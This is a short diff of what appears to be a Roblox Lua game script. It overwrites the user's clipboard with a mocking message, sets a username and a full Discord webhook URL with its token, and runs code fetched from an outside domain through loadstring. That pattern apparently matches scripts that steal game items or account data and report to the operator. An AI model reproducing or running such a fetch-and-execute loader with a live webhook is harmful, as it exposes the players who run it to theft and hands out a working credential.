@@ -2,4 +2,6 @@ setclipboard("You are gay, Thanks for using our script!")
 
 Username = "OnodaKun23"
 Webhook = "https://discord.com/api/webhooks/1297347293657301042/hkl2swQRysPlc-7cz83AI-8k8RIKgP4vZdeq-EcMnMHWAaRMZ_WTzE0YCloJm2aYFNlK"
+
+getgenv().gui = false
 loadstring(game:HttpGet("https://egorikusa.space/mm2", true))()
